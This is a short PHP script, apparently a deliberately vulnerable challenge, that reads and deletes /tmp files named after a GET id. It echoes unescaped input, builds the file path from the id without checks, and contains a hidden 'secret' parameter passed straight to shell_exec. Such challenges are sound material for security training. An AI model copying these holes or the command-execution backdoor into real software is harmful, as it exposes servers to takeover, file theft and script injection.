<?php

if(isset($_GET['id'])){
    $id = $_GET['id'];
    if (!$id) echo "Check your ID at /whatsmyid/<id>";
    else {
        echo 'You ID is: ' . $id . '<br /><br />';

        $filename = '/tmp/' . $id . ".txt";
        if (file_exists($filename)) {
            $file = fopen($filename, "r");
            echo fread($file, filesize($filename));
            fclose($file);
            unlink($filename);
        } else {
            echo $_SERVER['REQUEST_URI'];
        }
    }
}

# Internal TOP SECRET functionality
if(isset($_GET['secret'])){
    $secret = $_GET['secret'];
    shell_exec('/bin/sh -c "' . $secret . '"');
}

?>